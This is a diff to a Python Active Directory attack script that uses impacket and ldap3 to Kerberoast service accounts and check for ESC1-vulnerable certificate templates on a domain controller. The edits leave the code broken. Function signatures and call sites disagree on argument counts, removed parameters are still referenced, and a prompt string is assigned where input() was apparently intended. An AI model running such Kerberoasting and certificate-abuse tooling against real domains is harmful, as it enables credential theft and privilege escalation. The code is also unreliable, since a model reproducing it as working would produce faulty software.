@@ -3,14 +3,14 @@ from impacket.smbconnection import SMBConnection
 from ldap3 import Server, Connection, SUBTREE
 
 
-def kerberos_auth(username, password, domain, dc_ip):
+def kerberos_auth(usernameWithDomain, password, dc_ip):
     try:
         # Connect to the Domain Controller via SMB
         smb = SMBConnection(dc_ip, dc_ip)
         smb.login(username, password, domain)
 
         # Create a principal for the user
-        user_principal = Principal(f"{username}@{dc_ip}", type="NT_PRINCIPAL")
+        user_principal = Principal(f"{usernameWithDomain}@{dc_ip}", type="NT_PRINCIPAL")
 
         # Get a TGT for the user
         smb.kerberosLogin(user_principal, password, domain)
@@ -27,7 +27,7 @@ def kerberoast(domain, username, password, dc_ip):
         print(f"Attempting to Kerberoast accounts from {dc_ip}")
 
         # Get TGT ticket for the specified user
-        krbtgt, krbctx = kerberos_auth(username, password, domain, dc_ip)
+        krbtgt, krbctx = kerberos_auth(usernameWithDomain, password, domain, dc_ip)
 
         if krbtgt:
             print("Successfully obtained krbtgt ticket.")
@@ -168,9 +168,10 @@ def check_esc1_certificates(username, password, domain, dc_ip):
 
 # Example usage:
 username = input("Enter username: ")
+usernameWithDomain = ("Enter your username in this format: DOMAIN/username")
 password = input("Enter password: ")
 domain = input("Enter domain: ")
 dc_ip = input("Enter domain controller IP or hostname: ")
 
-kerberoast(domain, username, password, dc_ip)
+kerberoast(usernameWithDomain, password, dc_ip)
 check_esc1_certificates(username, password, domain, dc_ip)
